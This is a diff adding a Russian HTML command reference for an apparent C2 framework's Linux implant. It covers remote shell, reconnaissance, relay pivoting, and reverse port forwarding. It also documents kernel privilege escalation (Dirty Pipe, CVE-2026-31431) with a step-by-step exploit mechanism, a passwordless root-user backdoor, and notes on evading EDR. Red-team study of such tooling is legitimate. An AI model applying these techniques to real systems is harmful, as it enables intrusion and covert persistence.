@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Команды Linux beacon'а</title>
+<link rel="stylesheet" href="style.css">
+</head><body>
+<nav class="crumbs"><a href="index.html">Главная</a> &raquo; <a href="commands.html">Команды</a> &raquo; Linux beacon</nav>
+
+<h1>Команды Linux beacon'а</h1>
+
+<p>Linux beacon поддерживает все <b>общие команды</b> (файловая система, shell, sleep, exit,
+screenshot, download, upload) и набор команд, специфичных для Linux.
+Общие команды описаны в <a href="commands.html">основном справочнике</a>.</p>
+
+<div class="note">
+Linux beacon собирается как ELF-бинарник (<code>beacon-linux64</code>) и разделяемая
+библиотека (<code>beacon-linux64.so</code>). Библиотечный вариант запускается через
+<code>LD_PRELOAD</code> или <code>dlopen</code> &mdash; beacon стартует в отдельном
+потоке при загрузке <code>.so</code>.
+</div>
+
+<h2 id="fs-linux">Файловая система</h2>
+<table>
+<tr><th>Команда</th><th>Аргументы</th><th>Описание</th></tr>
+<tr><td><code>cat</code></td><td><code>&lt;path&gt;</code></td>
+    <td>Вывести содержимое файла. Чанкованная передача для больших файлов.</td></tr>
+<tr><td><code>mkdir</code></td><td><code>&lt;path&gt;</code></td>
+    <td>Создать каталог (<code>mkdir(path, 0755)</code>).</td></tr>
+<tr><td><code>chmod</code></td><td><code>&lt;mode&gt; &lt;path&gt;</code></td>
+    <td>Сменить права файла. Режим задаётся восьмеричным числом
+        (например <code>chmod 755 /tmp/payload</code>).</td></tr>
+</table>
+
+<h2 id="exec-linux">Выполнение и процессы</h2>
+<table>
+<tr><th>Команда</th><th>Аргументы</th><th>Описание</th></tr>
+<tr><td><code>shell</code></td><td><code>&lt;cmd&gt;</code></td>
+    <td>Выполнить команду через <code>fork()</code> + <code>execl("/bin/sh", "sh", "-c", cmd)</code>.
+        Stdout и stderr перехватываются через <code>pipe()</code>.</td></tr>
+<tr><td><code>ps</code></td><td></td>
+    <td>Список процессов: чтение <code>/proc/[pid]/stat</code>,
+        <code>/proc/[pid]/status</code> и <code>/proc/[pid]/cmdline</code>.
+        Формат: <code>PID|PPID|UID|USER|CMD</code>.</td></tr>
+<tr><td><code>kill</code></td><td><code>&lt;pid&gt;</code></td>
+    <td>Завершить процесс сигналом <code>SIGKILL</code>.</td></tr>
+</table>
+
+<h2 id="sysinfo">Информация о системе</h2>
+<table>
+<tr><th>Команда</th><th>Аргументы</th><th>Описание</th></tr>
+<tr><td><code>whoami</code></td><td></td>
+    <td>Текущий пользователь (<code>getpwuid(getuid())</code>).</td></tr>
+<tr><td><code>id</code></td><td></td>
+    <td>UID, GID, EUID, EGID и список дополнительных групп.</td></tr>
+<tr><td><code>hostname</code></td><td></td>
+    <td>Имя хоста (<code>gethostname()</code>).</td></tr>
+<tr><td><code>env</code></td><td></td>
+    <td>Переменные окружения процесса (полный дамп <code>environ</code>).
+        При большом объёме данные передаются чанками.</td></tr>
+<tr><td><code>ifconfig</code></td><td></td>
+    <td>Список сетевых интерфейсов и IP-адресов (IPv4/IPv6) через
+        <code>getifaddrs()</code>.</td></tr>
+</table>
+
+<h2 id="screenshot-linux">Скриншот</h2>
+<table>
+<tr><th>Команда</th><th>Аргументы</th><th>Описание</th></tr>
+<tr><td><code>screenshot</code></td><td></td>
+    <td>Захват экрана в формате 24-bit BMP. Файл сохраняется на рабочем столе оператора:
+        <code>screenshot_&lt;beaconId&gt;_&lt;timestamp&gt;.bmp</code>.</td></tr>
+</table>
+
+<p>Два метода захвата (по приоритету):</p>
+<ol>
+<li><b>X11</b> &mdash; загрузка <code>libX11.so.6</code> через <code>dlopen()</code>
+    (без зависимости при компиляции). Захватывает корневое окно
+    (<code>XGetImage</code> на root window). Поддержка 32/24/16 бит.
+    Работает на системах с X-сервером.</li>
+<li><b>Фреймбуфер</b> &mdash; чтение <code>/dev/fb0</code> через <code>mmap()</code>.
+    Работает на TTY, embedded-системах и серверах без графической оболочки.
+    Требует доступ на чтение к <code>/dev/fb0</code>.</li>
+</ol>
+
+<div class="note">
+Если ни X11, ни фреймбуфер не доступны, команда возвращает ошибку:
+<code>screenshot: no X11 display and /dev/fb0 unavailable</code>.
+</div>
+
+<h2 id="privesc-linux">Повышение привилегий</h2>
+<table>
+<tr><th>Команда</th><th>Аргументы</th><th>Описание</th></tr>
+<tr><td><code>privesc_root</code></td><td><code>[method]</code></td>
+    <td>Повышение привилегий до root через уязвимости ядра.</td></tr>
+</table>
+
+<p>Поддерживаются два семейства уязвимостей:</p>
+<ul>
+<li><b>Dirty Pipe</b> (CVE-2022-0847) &mdash; перезапись page cache через pipe buffer flag.
+    Ядра 5.8&ndash;5.16.10.</li>
+<li><b>Copy Fail</b> (CVE-2026-31431) &mdash; scratch-write в page cache через
+    <code>authencesn</code> шаблон AF_ALG. Ядра 4.14&ndash;6.19.12.</li>
+</ul>
+
+<h3 id="privesc-methods">Методы</h3>
+<table>
+<tr><th>Метод</th><th>Синтаксис</th><th>CVE</th><th>Описание</th></tr>
+<tr><td><code>passwd</code></td><td><code>privesc_root passwd</code></td>
+    <td>2022-0847</td>
+    <td>Перезапись <code>/etc/passwd</code>: добавляет пользователя
+        <code>r00t</code> (uid=0, пустой пароль). Dirty Pipe.</td></tr>
+<tr><td><code>suid</code></td><td><code>privesc_root suid &lt;path&gt;</code></td>
+    <td>2022-0847</td>
+    <td>Перезапись SUID-бинарника: записывает ELF-шелкод
+        (<code>setuid(0)+execve("/bin/sh")</code>). Dirty Pipe.</td></tr>
+<tr><td><code>afalg</code></td><td><code>privesc_root afalg &lt;path&gt;</code></td>
+    <td>2022-0847</td>
+    <td>AF_ALG вариант Dirty Pipe: использует <code>algif_aead</code> сокет
+        вместо обычного pipe. Обходит некоторые патчи.</td></tr>
+<tr><td><code>copyfail</code></td><td><code>privesc_root copyfail &lt;path&gt;</code></td>
+    <td>2026-31431</td>
+    <td>Перезапись SUID-бинарника через Copy Fail: scratch-write из
+        <code>authencesn</code> модуля пишет 4 байта за операцию в page cache.
+        Детерминистическая запись (без гонки).</td></tr>
+<tr><td><code>copyfail_passwd</code></td><td><code>privesc_root copyfail_passwd</code></td>
+    <td>2026-31431</td>
+    <td>Перезапись <code>/etc/passwd</code> через Copy Fail.
+        Аналог метода <code>passwd</code>, но для ядер 4.14&ndash;6.19.</td></tr>
+</table>
+
+<h3 id="privesc-copyfail">CVE-2026-31431 — Copy Fail</h3>
+<p>Логическая ошибка в шаблоне <code>authencesn</code> (Extended Sequence Number)
+модуля <code>algif_aead</code>. При расшифровке ядро записывает 4 байта из IV
+в позицию <code>assoclen-8</code> исходного scatterlist'а. Если страницы данных
+были получены через <code>splice()</code> из файла, запись попадает напрямую
+в page cache.</p>
+
+<p><b>Механизм:</b></p>
+<ol>
+<li><code>socket(AF_ALG)</code> → bind к
+    <code>authencesn(hmac(sha256),cbc(aes))</code></li>
+<li><code>setsockopt</code>: ключ (formат authencesn) + authsize=32</li>
+<li><code>accept()</code> → operation fd</li>
+<li><code>sendmsg()</code> с cmsg: op=decrypt, IV[0..3]=payload, assoclen=offset+12</li>
+<li><code>splice()</code> страниц целевого файла в operation fd (zero-copy)</li>
+<li><code>recv()</code> → ядро вызывает <code>crypto_authenc_esn_decrypt()</code>
+    → запись IV[0..3] в <code>src[assoclen-8]</code> = page cache файла</li>
+</ol>
+
+<p><b>Преимущества перед Dirty Pipe:</b></p>
+<ul>
+<li>Работает на ядрах <b>4.14+</b> (Dirty Pipe: только 5.8–5.16.10)</li>
+<li>Может писать по смещению <b>0</b> (Dirty Pipe: минимум 1)</li>
+<li>Детерминистическая: нет гонки с pipe buffer flags</li>
+</ul>
+
+<p><b>Ограничения:</b></p>
+<ul>
+<li>4 байта за операцию (Dirty Pipe: до PAGE_SIZE)</li>
+<li>Требует модуль <code>algif_aead</code> + <code>authencesn</code> в ядре</li>
+<li>Целевой файл должен быть ≥ 256 байт (для splice)</li>
+</ul>
+
+<h3 id="privesc-kernel">Совместимость (Dirty Pipe — CVE-2022-0847)</h3>
+<table>
+<tr><th>Ядро</th><th>Статус</th></tr>
+<tr><td>&lt; 5.8</td><td>Не уязвимо (PIPE_BUF_FLAG_CAN_MERGE отсутствует)</td></tr>
+<tr><td>5.8 &ndash; 5.10.101</td><td>Уязвимо</td></tr>
+<tr><td>5.10.102+</td><td>Исправлено</td></tr>
+<tr><td>5.11 &ndash; 5.15.24</td><td>Уязвимо</td></tr>
+<tr><td>5.15.25+</td><td>Исправлено</td></tr>
+<tr><td>5.16 &ndash; 5.16.10</td><td>Уязвимо</td></tr>
+<tr><td>5.16.11+</td><td>Исправлено</td></tr>
+</table>
+
+<h3 id="privesc-kernel-copyfail">Совместимость (Copy Fail — CVE-2026-31431)</h3>
+<table>
+<tr><th>Ядро</th><th>Статус</th></tr>
+<tr><td>&lt; 4.14</td><td>Не уязвимо (<code>authencesn</code> отсутствует)</td></tr>
+<tr><td>4.14 &ndash; 6.19.12</td><td>Уязвимо</td></tr>
+<tr><td>6.19.13+</td><td>Исправлено</td></tr>
+<tr><td>6.20+</td><td>Исправлено</td></tr>
+</table>
+
+<div class="opsec">
+Оба метода записывают в page cache ядра &mdash; антивирусы и EDR на уровне
+пользователя не перехватывают запись. Однако целостность файлов (AIDE, dm-verity)
+может обнаружить изменения. Copy Fail оставляет следы в виде множества
+<code>AF_ALG</code> сокетов в аудит-логах (если включён <code>audit</code>).
+</div>
+
+<div class="warning">
+<b>Версия ядра:</b> перед использованием проверьте версию командой
+<code>shell uname -r</code>. Copy Fail дополнительно проверяет доступность
+модуля <code>authencesn</code> &mdash; если модуль не загружен, вернёт ошибку.
+</div>
+
+<h2 id="ishell-linux">Интерактивная оболочка (ishell)</h2>
+<table>
+<tr><th>Команда</th><th>Аргументы</th><th>Описание</th></tr>
+<tr><td><code>ishell</code></td><td><code>&lt;text&gt;</code></td>
+    <td>Отправить строку на STDIN запущенного <code>/bin/sh</code>.
+        Если оболочка ещё не создана — запускается автоматически
+        (<code>fork()</code> + <code>execl("/bin/sh")</code>,
+        ввод/вывод через <code>socketpair(AF_UNIX)</code>).</td></tr>
+<tr><td><code>ishell</code></td><td>(пустой)</td>
+    <td>Закрыть интерактивную оболочку: закрыть сокет, дождаться
+        завершения дочернего процесса.</td></tr>
+</table>
+
+<p>В отличие от <code>shell</code>, который создаёт новый процесс на каждую команду,
+<code>ishell</code> держит один <code>/bin/sh</code> между вызовами.
+Это позволяет запускать длительные команды (linpeas, tcpdump и т.д.)
+и получать вывод по частям: основной цикл beacon'а вызывает
+<code>ishell_pump()</code> каждую итерацию и отправляет накопленный stdout/stderr.</p>
+
+<div class="note">
+Консоль оператора переключается в режим <code>[interactive shell]</code>.
+Каждая введённая строка — это <code>ishell &lt;text&gt;</code>.
+Команда <code>exit</code> внутри режима закрывает <code>/bin/sh</code>,
+не останавливая beacon.
+</div>
+
+<h2 id="pivot-linux">Pivot и ретрансляция</h2>
+<table>
+<tr><th>Команда</th><th>Аргументы</th><th>Описание</th></tr>
+<tr><td><code>tcp_pivot</code></td><td><code>&lt;host&gt; &lt;port&gt;</code></td>
+    <td>Открыть raw-TCP-канал к pivot-listener'у на teamserver'е.
+        Beacon создаёт TCP-соединение к <code>host:port</code>
+        и мультиплексирует трафик через этот канал.
+        Позволяет beacon'у в изолированном сегменте
+        достучаться до teamserver'а через beacon-посредника.</td></tr>
+</table>
+
+<h3 id="relay-linux">Relay (цепочный pivot)</h3>
+<p>Linux beacon поддерживает relay-механизм — родительский beacon открывает
+TCP-порт, к которому подключаются дочерние beacon'ы. Весь трафик дочерних
+beacon'ов ретранслируется через родительский к teamserver'у.</p>
+<table>
+<tr><th>Команда</th><th>Аргументы</th><th>Описание</th></tr>
+<tr><td><code>relay_start</code></td><td><code>&lt;port&gt;</code></td>
+    <td>Открыть TCP-listener на указанном порту.
+        Каждое принятое соединение — дочерний beacon.
+        Максимум 8 одновременных дочерних сессий.</td></tr>
+<tr><td><code>relay_stop</code></td><td></td>
+    <td>Закрыть relay-listener и все дочерние соединения.</td></tr>
+</table>
+
+<p>Relay-кадры от дочерних beacon'ов отправляются с магическим
+<code>task_id = 0xFFFFFFFFFFFFFFFD</code>, который teamserver маршрутизирует
+отдельно от обычных ответов. Оператор видит дочерние beacon'ы как
+независимые сессии в таблице Sessions.</p>
+
+<div class="note">
+Relay-команды вызываются из контекстного меню Sessions/Graph:
+<b>Start relay port (chain pivot)…</b> и
+<b>Generate relay child beacon…</b>.
+Вручную из консоли вводить не нужно.
+</div>
+
+<h3 id="rportfwd-linux">Reverse Port Forward</h3>
+<p>Teamserver открывает TCP-порт (bind); при входящем подключении трафик идёт
+через C2-канал к beacon'у, который пробрасывает его к <code>rhost:rport</code>.
+Архитектурно &mdash; зеркало SOCKS5: клиент подключается к teamserver'у, а не к
+прокси-клиенту оператора. Максимум 16 одновременных соединений.</p>
+
+<table>
+<tr><th>Способ создания</th><th>Описание</th></tr>
+<tr><td>Sessions &rarr; правый клик &rarr; <b>Start Reverse Port Forward&hellip;</b></td>
+    <td>Диалог: <b>Bind host</b> и <b>Bind port</b> &mdash; что откроет teamserver;
+        <b>Rhost</b> и <b>Rport</b> &mdash; цель, к которой подключается beacon.
+        После нажатия OK teamserver начинает слушать. При первом входящем
+        подключении beacon устанавливает соединение с rhost:rport.</td></tr>
+</table>
+
+<p><b>Схема трафика:</b></p>
+<pre>внешний клиент &rarr; teamserver:bind_port &rarr; (C2-канал) &rarr; beacon &rarr; rhost:rport</pre>
+
+<p><b>Протокол:</b> данные передаются через out-of-band кадры с магическим
+<code>task_id = 0xFFFFFFFFFFFFFFFC</code> (<code>RPORTFWD_TASK_MAGIC</code>).
+Формат кадра: <code>[u64 conn_id BE][u8 type][payload]</code>, где type:</p>
+<ul>
+<li><code>0x01</code> &mdash; CONNECT_OK (beacon успешно подключился к rhost:rport)</li>
+<li><code>0x02</code> &mdash; CONNECT_FAIL (ошибка подключения)</li>
+<li><code>0x03</code> &mdash; DATA: <code>[u32 len BE][bytes]</code></li>
+<li><code>0x04</code> &mdash; CLOSE (соединение закрыто)</li>
+</ul>
+
+<div class="opsec">
+<b>Пример &mdash; доступ к внутреннему веб-серверу через teamserver:</b><br>
+Bind host: <code>0.0.0.0</code>, Bind port: <code>8080</code>,
+Rhost: <code>internal-webapp.corp.local</code>, Rport: <code>80</code><br>
+<code>curl http://teamserver-ip:8080/</code><br><br>
+<b>Отличие от SOCKS5:</b> SOCKS5 туннелирует произвольный трафик через polling-цикл;
+rportfwd открывает конкретный порт напрямую на teamserver'е, не требует
+SOCKS5-клиента, работает для любого TCP-протокола.
+</div>
+
+<h2 id="control-linux">Управление</h2>
+<p>Команды <code>sleep</code> и <code>exit</code> работают идентично Windows beacon'у &mdash;
+см. <a href="commands.html#control">Управление beacon'ом</a>.</p>
+
+</body></html>
